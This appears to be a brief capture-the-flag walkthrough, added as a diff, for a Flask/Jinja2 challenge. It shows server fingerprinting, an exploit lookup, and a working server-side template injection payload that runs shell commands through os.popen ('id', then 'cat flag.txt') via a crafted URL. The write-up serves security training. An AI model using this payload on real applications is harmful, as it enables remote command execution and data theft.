@@ -1,0 +1,21 @@
+Walkthrought(Challenge): Template
+
+$ whatweb 68.183.36.105:32550
+http://68.183.36.105:32550 [200 OK] Country[UNITED STATES][US], HTTPServer[Werkzeug/1.0.1 Python/3.9.0], IP[68.183.36.105], PoweredBy[Flask/Jinja2], Python[3.9.0], Werkzeug[1.0.1]
+
+$ searchsploit Jinja2  
+
+--------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                       |  Path
+--------------------------------------------------------------------- ---------------------------------
+Jinja2 2.10 - 'from_string' Server Side Template Injection           | python/webapps/46386.py
+--------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+#We look in Payload all the things for payloads
+# {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }} <---Check this payload works and it does work
+
+http://167.99.86.249:30711/%7B%7B%20self._TemplateReference__context.namespace.__init__.__globals__.os.popen('cat%20flag.txt').read()%20%7D%7D
+
+#Entering this in the browser search bar gives us the flag
